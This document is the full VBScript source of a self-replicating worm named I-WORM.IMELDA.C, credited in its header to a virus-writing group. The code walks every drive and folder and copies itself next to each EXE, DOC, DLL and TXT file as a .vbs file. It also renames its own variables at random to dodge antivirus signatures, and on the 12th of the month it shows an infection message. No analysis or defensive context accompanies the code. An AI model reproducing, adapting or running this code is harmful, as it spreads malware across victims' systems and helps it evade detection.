'I-WORM.IMELDA.C
'Poly & Crypt - (C)2001, by Iwing
'Virusindo - Indonesian Virus Network
'http://indovirus.8m.com , IRC Dalnet #indovirus
'===============================================
Call OMOSEN
Set PVBJTV = CreateObject("scripting.filesystemobject")
Call OANPRR
if day(now) = 12 then
PFHEND = msgbox("Hi there.., you are infected by some of" & Chr(13) & _
"IWING creations.., Poly & crypt By. Iwing - have a nice day", 10 ,"I-WORM.IMELDA.C ")
end if
Function OANPRR()
On Error Resume Next
Set HRFKFD = PVBJTV.Drives
For Each HBCTMF In  HRFKFD
DUQUSB = HBCTMF & "\"
Call FGNLPO(DUQUSB)
Next
End Function
Function FGNLPO(KUIQFV)
KEVQJU = KUIQFV
Set ILKMKL = PVBJTV.GetFolder(KEVQJU)
Set MSPMJD =  ILKMKL.Files
For Each  EUESUU In MSPMJD
If PVBJTV.GetExtensionName(EUESUU.Path) = "EXE" Then
PVBJTV.CopyFile wscript.scriptfullname, EUESUU.Path & ".vbs", True
End If
If PVBJTV.GetExtensionName(EUESUU.Path) = "DOC" Then
PVBJTV.CopyFile wscript.scriptfullname, EUESUU.Path & ".vbs", True
End If
If PVBJTV.GetExtensionName(EUESUU.Path) = "DLL" Then
PVBJTV.CopyFile wscript.scriptfullname, EUESUU.Path & ".vbs", True
End If
If PVBJTV.GetExtensionName(EUESUU.Path) = "TXT" Then
PVBJTV.CopyFile wscript.scriptfullname, EUESUU.Path & ".vbs", True
End If
Next
Set BMBHMK = ILKMKL.Subfolders
For Each  ODOJDV In BMBHMK
Call FGNLPO(ODOJDV.Path)
Next
End Function
function OMOSEN
Randomize
Set PINKCM = CreateObject("scripting.filesystemobject")
Set CGSRITL = PINKCM.OpenTextFile(WScript.ScriptFullName, 1)
EKIBHJ = CGSRITL.Readall
MJUBVK = "PVBJTV OANPRR PFHEND HRFKFD HBCTMF DUQUSB FGNLPO KEVQJU KUIQFV EUESUU MSPMJD BMBHMK ODOJDV OMOSEN PINKCM CGSRIT EKIBHJ MJUBVK BECQNP JKLAQE CGSRITL ILKMKL "
Do
BECQNP = Left(MJUBVK, InStr(MJUBVK, Chr(32)) - 1)
MJUBVK = Mid(MJUBVK, InStr(MJUBVK, Chr(32)) + 1)
VNOFVA = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
JKLAQE = InStr(JKLAQE + 1, EKIBHJ, BECQNP)
If JKLAQE Then EKIBHJ = Mid(EKIBHJ, 1, (JKLAQE - 1)) & VNOFVA & Mid(EKIBHJ, (JKLAQE + Len(BECQNP)))
Loop While JKLAQE
Loop While MJUBVK <> ""
Set CGSRITL = PINKCM.OpenTextFile(WScript.ScriptFullName, 2, True)
CGSRITL.Writeline EKIBHJ
end function

